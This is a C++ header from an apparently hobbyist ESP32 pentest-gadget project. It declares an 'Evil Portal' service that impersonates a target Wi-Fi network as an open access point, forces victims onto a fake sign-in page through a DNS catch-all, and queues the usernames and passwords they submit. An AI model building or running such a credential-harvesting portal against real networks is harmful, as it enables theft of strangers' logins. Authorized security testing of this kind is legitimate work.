#pragma once

#include <Arduino.h>
#include <DNSServer.h>
#include <WebServer.h>

#include <vector>

// Evil Portal: clones a target SSID as an open access point, wraps it in a
// captive-portal DNS redirect + a sign-in page, and queues whatever gets
// submitted for main.cpp to log/cue. A single ongoing session against one
// target -- not a Familiar Mission (see docs/authorized-use.md for the
// operator-authorization framing this mirrors from the Handshake Mission).
//
// Owns the radio (AP mode) and the DNS/HTTP servers; deliberately does NOT
// own SD logging or FamiliarCue/Loot Board hooks, matching how
// WifiGuardianService stays plain-state and leaves logging to main.cpp
// (see guardianEventLogger.append() built from wifiGuardianService fields).
// main.cpp polls takeCapture() once per loop() the same way it already
// polls wifiGuardianService.takeAlert().
class EvilPortalService {
public:
    struct Capture {
        String clientIp;
        String username;
        String password;
    };

    // Starts the AP (open, no password) on the given channel using ssid,
    // then the DNS catch-all and HTTP server. Returns false (leaving
    // nothing started) if softAP setup fails.
    bool begin(const String& ssid, uint8_t channel);
    // Call every loop() tick; no-op when not active.
    void update();
    void stop();

    bool isActive() const { return active_; }
    const String& ssid() const { return ssid_; }
    // Associated station count -- WiFi.softAPgetStationNum(), i.e. clients
    // connected to the fake AP right now, whether or not they've hit the
    // portal page yet.
    uint32_t clientCount() const;
    uint32_t captureCount() const { return captureCount_; }

    // Pops the oldest queued submission. Returns false when none pending.
    bool takeCapture(Capture& out);

private:
    void handlePortalPage();
    void handleSubmit();

    DNSServer dnsServer_;
    WebServer server_{80};
    bool active_ = false;
    String ssid_;
    uint32_t captureCount_ = 0;
    std::vector<Capture> pending_;
};
